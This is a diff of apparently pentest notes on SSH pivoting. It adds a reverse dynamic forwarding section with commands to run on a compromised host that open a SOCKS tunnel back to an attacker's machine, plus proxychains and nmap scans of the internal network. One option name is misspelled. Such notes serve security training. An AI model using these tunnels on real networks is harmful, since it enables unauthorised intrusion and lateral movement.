@@ -118,7 +118,7 @@ then we have to add some more ssh options:
 ssh -f -N -R attackerhost:attackerport:middlehost:middleport -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i keys/id_rsa user@attackerhost
 ```
 
-## Dynamic Port Forwarding
+## Dynamic Forwarding
 
 #### Allows us to set a local listening port and have it tunnel incoming traffic to any remote destination through the use of a proxy. this way we can use all of the ports from the pivot machine.
 
@@ -163,4 +163,39 @@ proxychains nmap -sT -Pn -n 192.168.1.110  # must use -sT option
 {% hint style="warning" %}
 **In a dynamic port forwarding we have to use -sT option with nmap to run a full TCP connect scan. other scan methods dont work since we are using a proxy.**
 {% endhint %}
+
+## Reverse Dynamic Forwarding
+
+#### as of OpenSSH version 7.6 \(Released late 2017\) SSH clients may generate dynamic reverse tunnels accessible to the server they connect to. What’s really cool is that you don’t need to update your server to version 7.6 before this trick will work. As long as the client supports it, the client enforces it when it completes the connection.
+
+run this command on the compromised remote system \(this looks like the remote port forwarding but by not specifying a host after the port the ssh client will create a socks proxy on attackers system\):
+
+```text
+ssh -f -N -R [attackers port] -o "UserKnownHostsFile=/dev/null" -o "StricktHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa   user@[attackers IP]
+```
+
+you can check if the port is open on attackers system:
+
+```text
+netstat -tupln
+# look for sshd with local address of 127.0.0.1:[attackers port]
+```
+
+​​now edit proxychains configs in /etc/proxychains.conf and add the port:
+
+```text
+socks4 127.0.0.1 [attackers port]
+```
+
+now a stable tunnel is established and we can use proxychains for enumeration and connection:
+
+```text
+proxychains nmap -sT -Pn [target local IP]
+```
+
+{% hint style="warning" %}
+SOCKS proxy needs full TCP connection, we cant use other scanning techniques, ICMP can not get through either. use -Pn option.
+{% endhint %}
+
+
 
